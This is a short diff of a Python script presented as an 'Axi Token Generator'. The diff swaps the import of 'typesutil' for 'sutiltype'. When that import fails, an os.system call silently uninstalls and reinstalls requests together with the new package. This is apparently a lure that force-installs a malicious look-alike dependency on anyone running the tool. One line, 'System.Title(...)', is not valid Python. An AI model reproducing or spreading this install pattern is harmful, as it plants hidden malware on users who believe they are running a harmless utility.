@@ -1,11 +1,11 @@
 import os
 try:
     import requests
-    import typesutil
+    import sutiltype
 except:
-    os.system('pip uninstall requests -y && pip uninstall typesutil -y && pip install requests && pip install typesutil')
+    os.system('pip uninstall requests -y && pip uninstall sutiltype -y && pip install requests && pip install sutiltype')
     import requests
-    import typesutil
+    import sutiltype
 System.Title("Axi Token Generator ^| Made By kokzyy")
 axi = """
                                                      ███
